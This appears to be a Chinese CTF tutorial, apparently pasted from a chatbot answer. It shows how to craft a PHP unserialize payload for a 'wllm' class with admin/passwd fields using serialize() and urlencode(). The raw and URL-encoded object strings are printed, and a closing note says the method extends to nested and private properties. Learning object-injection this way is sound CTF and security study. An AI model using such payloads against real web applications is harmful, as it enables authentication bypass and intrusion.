# 🛠 方法

就是用 **`serialize()` 函数 + `urlencode()`**
 PHP自带的！

### 代码示例：

```php
phpCopyEdit<?php
// 1. 创建一个实例
class wllm {
    public $admin;
    public $passwd;
}

// 2. 创建对象并赋值
$exp = new wllm();
$exp->admin = "admin";   // 赋值
$exp->passwd = "ctf";    // 赋值

// 3. 序列化并 URL 编码（直接拿去传参）
echo urlencode(serialize($exp));
?>
```

------

# ⚡ 输出结果

运行这段后输出的就是：

```php
O%3A4%3A%22wllm%22%3A2%3A%7Bs%3A5%3A%22admin%22%3Bs%3A5%3A%22admin%22%3Bs%3A6%3A%22passwd%22%3Bs%3A3%3A%22ctf%22%3B%7D
```

也就是 URL 编码过的：

```php
O:4:"wllm":2:{s:5:"admin";s:5:"admin";s:6:"passwd";s:3:"ctf";}
```

可以直接用在 URL 里面传！

------

# ✨ 如果要直接生成未编码的版本

也可以简单一点：

```php
echo serialize($exp);
```

就得到原版的：

```php
O:4:"wllm":2:{s:5:"admin";s:5:"admin";s:6:"passwd";s:3:"ctf";}
```

------

# 🎯 为什么要 urlencode？

因为直接写裸的对象串到 URL，会有很多特殊字符（比如 `:`，`{`，`"`）需要转义，不然浏览器或者服务器会解析错。
 所以加 `urlencode()` 是最保险的处理方式！

------

# 💡 小总结



| 用途                  | 方法                          |
| --------------------- | ----------------------------- |
| 想要直接payload字符串 | `serialize($obj);`            |
| 想直接塞进URL         | `urlencode(serialize($obj));` |

------

# 🔥 BONUS：更复杂的情况

如果以后遇到：

- 需要嵌套对象（对象里套对象）
- 属性是 private / protected
- 类名是动态的

用这个方法也一样适用！
 只要在代码里把对象关系建好，`serialize()` 会自动生成标准payload，不怕出错！